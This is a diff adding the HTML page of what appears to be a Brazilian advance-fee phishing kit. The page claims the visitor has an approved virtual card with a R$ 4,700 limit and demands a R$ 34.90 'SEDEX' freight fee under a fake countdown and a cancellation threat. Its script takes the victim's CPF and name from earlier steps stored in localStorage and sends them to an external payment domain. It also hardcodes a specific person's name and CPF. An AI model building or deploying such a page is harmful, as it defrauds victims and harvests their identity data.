@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <script src="js/latest.js" data-utmify-prevent-subids="" async defer></script>
+  <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1289289589600537');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1289289589600537&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+  <meta charset="UTF-8">
+  <link href="css/bootstrap.min.css" rel="stylesheet">
+  <link href="css/all.min.css" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Pagamento de Frete - SEDEX</title>
+  <style>
+    body { font-family: Arial, sans-serif; background-color: #fff; color: #333; margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }
+    .header {
+            background-color: #1E3A80;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border-bottom: solid 3px #ee4d2d;
+        }
+    .header img { width: 120px; }
+    .main-content { max-width: 500px; background-color: white; text-align: center; padding: 2rem; border-radius: 10px; box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1); margin: 40px auto; }
+    .card-virtual { background-color: #1e293b; color: white; border-radius: 15px; padding: 20px; margin-bottom: 20px; text-align: left; position: relative; }
+    .card-header { font-weight: bold; font-size: 18px; }
+    .card-number { font-size: 20px; letter-spacing: 3px; margin: 15px 0; }
+    .card-info { display: flex; justify-content: space-between; }
+    .card-info div { font-size: 12px; }
+    .mastercard-logo { position: absolute; top: 20px; right: 20px; width: 50px; }
+    .details-section { background-color: #f9f9f9; border: 1px solid #e0e0e0; border-radius: 10px; padding: 15px; text-align: left; margin-top: 20px; }
+    .detail { display: flex; align-items: center; margin-bottom: 15px; }
+    .icon { font-size: 20px; color: #1E3A80; margin-right: 10px; }
+    .detail-text { font-size: 14px; line-height: 1.2; margin-bottom: 5px; }
+    .detail-title { font-weight: bold; color: #333; margin-bottom: 2px; }
+    .price { font-size: 28px; font-weight: bold; color: #1E3A80; margin-top: 15px; }
+    .btn-custom { background-color: #1E3A80; color: white; border: none; border-radius: 8px; padding: 12px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; }
+    .btn-custom:hover { background-color: #000; }
+    .secure-payment { font-size: 12px; color: #28a745; margin-top: 10px; display: flex; align-items: center; justify-content: center; }
+    .secure-payment i { margin-right: 5px; }
+    .scarcity { background-color: #ffe6e6; border: 1px solid #ff9999; border-radius: 8px; padding: 15px; color: #cc0000; text-align: center; margin-top: 20px; }
+    .scarcity i { font-size: 18px; margin-right: 5px; }
+    .scarcity strong { font-size: 14px; }
+    .footer { background: #ffffff; border-top: 1px solid #e6e6e6; text-align: center; padding: 15px; font-size: 10px; color: #666; }
+    .main-title { font-size: 20px; }
+    .faq-section { background-color: #f9f9f9; border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; margin: 20px 0; }
+    .faq-container { display: flex; flex-direction: column; gap: 10px; }
+    .faq-item { border-bottom: 1px solid #e0e0e0; padding-bottom: 10px; }
+    .faq-item:last-child { border-bottom: none; }
+    .faq-question { display: flex; justify-content: space-between; align-items: center; background: none; border: none; outline: none; font-size: 14px; font-weight: bold; text-align: left; width: 100%; cursor: pointer; color: #333; padding: 5px 0; }
+    .faq-answer { display: none; font-size: 12px; color: #666; margin-top: 5px; line-height: 1.4; }
+    .faq-question i { transition: transform 0.3s ease; }
+    .faq-item.open .faq-answer { display: block; }
+    .faq-item.open .faq-question i { transform: rotate(180deg); }
+    .popup-notification { position: fixed; bottom: 20px; left: 20px; background-color: #f9f9f9; border: 1px solid #ddd; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); border-radius: 10px; padding: 10px 15px; display: flex; align-items: center; gap: 10px; font-size: 14px; color: #333; display: none; z-index: 9999; }
+    .popup-notification i { color: #1E3A80; font-size: 18px; }
+    .popup-notification.show { display: flex; animation: fadeIn 0.5s ease, fadeOut 0.5s ease 4.5s; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes fadeOut { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(20px); } }
+    .loading-spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255, 255, 255, 0.6); border-top-color: #ffffff; border-radius: 50%; animation: spin 1s linear infinite; vertical-align: middle; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <img src="images/logo.svg" alt="Logo">
+</div>
+
+<div class="main-content">
+  <b><p style="font-size: 14px; color: #000;">Limite Disponível</p></b>
+  <b><h1 style="font-size: 28px; color: #1E3A80;">R$ 4.700,00</h1></b>
+
+  <div class="card-virtual">
+    <div class="card-header">Cartão Virtual</div>
+    <div class="card-number">4532 •••• •••• ••••</div>
+    <div class="card-info">
+      <div><strong>TITULAR</strong><div id="titular-nome"></div></div>
+      <div><strong>VALIDADE</strong><div>12/31</div></div>
+      <div><strong>CVV</strong><div>•••</div></div>
+    </div>
+    <img src="images/Visa-logo-whitea91b.png" alt="Mastercard Logo" class="mastercard-logo">
+  </div>
+
+  <b><h1 class="main-title">Finalize o envio do seu cartão</h1></b>
+  <p>Pague o frete para receber o cartão físico e ativar o virtual.</p>
+
+  <div class="details-section">
+    <div class="detail"><div><p class="detail-title">Método de Envio</p><p class="detail-text">CORREIOS - SEDEX</p></div></div>
+    <div class="detail"><div><p class="detail-title">Prazo de Entrega</p><p class="detail-text">1 dia útil</p></div></div>
+    <div class="detail"><div><p class="detail-title">Pagamento em Até 10 Minutos</p><p class="detail-text">Realize o pagamento do frete em até 10 minutos para ativar o cartão virtual.</p></div></div>
+    <div class="detail"><div><p class="detail-title">Ativação Após Pagamento</p><p class="detail-text">O cartão virtual será ativado automaticamente após a aprovação do pagamento.</p></div></div>
+  </div>
+
+  <p class="price">R$ 34,90</p>
+  <p class="payment-note">O pagamento será confirmado imediatamente</p>
+
+  <button class="btn-custom" id="pagar-frete">Pagar Frete</button>
+
+  <div class="secure-payment">
+    <i class="fas fa-lock"></i> Pagamento 100% seguro
+  </div>
+
+  <div class="scarcity" id="scarcity-block">
+    <div><i class="fas fa-clock"></i><span id="timer">05:00</span></div>
+    <strong>Essa oportunidade é válida apenas hoje!</strong>
+    <strong>O não pagamento fará que seu cartão seja cancelado</strong>
+  </div>
+</div>
+
+<script>
+  const valorEmReais = 34.90;
+  const valorEmCentavos = Math.round(valorEmReais * 100); // => 3490
+
+  document.getElementById("pagar-frete").addEventListener("click", function () {
+    const botao = this;
+    botao.innerHTML = '<span class="loading-spinner"></span> Redirecionando...';
+
+    // Busca os dados do CPF do localStorage (vindos da pasta 4)
+    const dadosCPF = JSON.parse(localStorage.getItem('dadosCPF')) || { 
+      nomeCompleto: "MICHAEL FRANCA DOS SANTOS", 
+      cpf: "33311996801"
+    };
+
+    // Constrói a URL do Assaí com os parâmetros
+    const baseUrl = "https://pay.assaipagamentos.space/rn4RgQvbJBN3wBV";
+    const documentParam = dadosCPF.cpf || "33311996801";
+    const nameParam = encodeURIComponent(dadosCPF.nomeCompleto || "MICHAEL FRANCA DOS SANTOS");
+    
+    const finalUrl = `${baseUrl}?document=${documentParam}&name=${nameParam}`;
+    
+    // Redireciona para a URL do Assaí
+    window.location.href = finalUrl;
+  });
+</script>
+
+</body>
+</html>
